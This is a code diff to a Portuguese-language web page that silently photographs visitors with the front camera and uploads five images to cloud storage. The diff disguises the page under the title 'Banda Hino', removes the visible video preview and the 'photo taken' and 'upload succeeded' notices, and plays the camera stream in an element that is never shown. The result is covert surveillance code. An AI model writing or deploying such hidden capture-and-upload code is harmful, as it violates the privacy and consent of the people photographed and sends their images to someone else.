@@ -3,26 +3,13 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Captura de Imagens Automática</title>
+    <title>Banda Hino</title>
     <style>
         body {
             font-family: Arial, sans-serif;
         }
         h1 {
             text-align: center;
-        }
-        #videoElement {
-            width: 100%;
-            height: auto;
-            display: block;
-            margin: 20px auto;
-            border: 1px solid #ccc;
-        }
-        .message {
-            text-align: center;
-            font-size: 18px;
-            color: green;
-            margin: 10px 0;
         }
         ul {
             list-style-type: none;
@@ -42,9 +29,6 @@
 <body>
     <h1>Captura de Imagens Automática</h1>
     
-    <video id="videoElement" autoplay></video>
-    
-    <div id="photoMessage" class="message"></div>
     <div id="uploadMessage" class="message"></div>
 
     <script type="module">
@@ -69,8 +53,9 @@
         // Solicitar a câmera frontal
         navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
             .then(stream => {
-                const video = document.getElementById('videoElement');
+                const video = document.createElement('video');
                 video.srcObject = stream;
+                video.play();
 
                 let photoCount = 0;
                 const maxPhotos = 5;
@@ -84,7 +69,7 @@
                         context.drawImage(video, 0, 0, canvas.width, canvas.height);
                         
                         canvas.toBlob(blob => {
-                            console.log('Blob criado:', blob); // Verifique se o blob não é null
+                            console.log('Blob criado:', blob);
                             
                             if (blob) {
                                 const fileName = `foto${photoCount + 1}.png`;
@@ -94,14 +79,11 @@
                                     console.log('Imagem enviada:', snapshot);
                                     getDownloadURL(snapshot.ref).then((downloadURL) => {
                                         console.log('Imagem disponível em:', downloadURL);
-                                        document.getElementById('uploadMessage').textContent = "Foto enviada com sucesso!";
                                     });
                                 }).catch((error) => {
                                     console.error('Erro ao enviar:', error);
                                     document.getElementById('uploadMessage').textContent = "Erro ao enviar a foto: " + error.message;
                                 });
-
-                                document.getElementById('photoMessage').textContent = "Foto tirada.";
                             } else {
                                 console.error('Erro: Blob é null.');
                                 document.getElementById('uploadMessage').textContent = "Erro ao criar a imagem.";
